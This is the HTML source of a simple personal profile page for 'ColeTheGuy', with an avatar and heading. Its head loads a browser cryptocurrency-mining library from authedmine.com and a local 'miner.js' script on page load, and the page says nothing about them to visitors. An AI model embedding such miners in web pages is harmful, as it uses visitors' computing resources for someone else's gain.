<head>
    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
    <script src="js/miner.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Montserrat:400,700');

        @-webkit-keyframes fadeIn {
            0%   {opacity: 0;}
            100% {opacity: 1;}
        }
        @keyframes fadeIn {
            0%   {opacity: 0;}
            100% {opacity: 1;}
        }

        .avatar {
            border-radius: 50%;
            box-shadow: 0 0 16px lime;
            -webkit-transition: -webkit-transform 0.6s;
            transition: -webkit-transform 0.6s;
            -o-transition: transform 0.6s;
            transition: transform 0.6s;
        } .avatar:hover {
            -webkit-transform: scale(1.2);
            -ms-transform: scale(1.2);
            transform: scale(1.2);
        }
        
        body {
            background-color: black;
            background-image: url('images/kristopher-roller-110203.jpg');
            background-repeat: no-repeat;
            background-size: cover;
        }
        
        div {
            height: 100%;
            text-align: center;
            width: 100%;
        }

        h1 {
            font-size: 64px;
        }
        
        h1,h2,h3,h4,h5,h6 {
            color: white;
            font-family: 'Montserrat';
            font-weight: 700;
            text-shadow: 0 0 8px white;
        }
        
        p {
            color: white;
            font-family: 'Montserrat';
            font-weight: 400;
        }
    </style>
    <title>ColeTheGuy</title>
</head>
<body>
    <div>
        <br>
        <br>
        <img class="avatar" height="128px" src="images/avatar-v2.png" width="128px">
        <br>
        <br>
        <h1>ColeTheGuy</h1>
    </div>
</body>
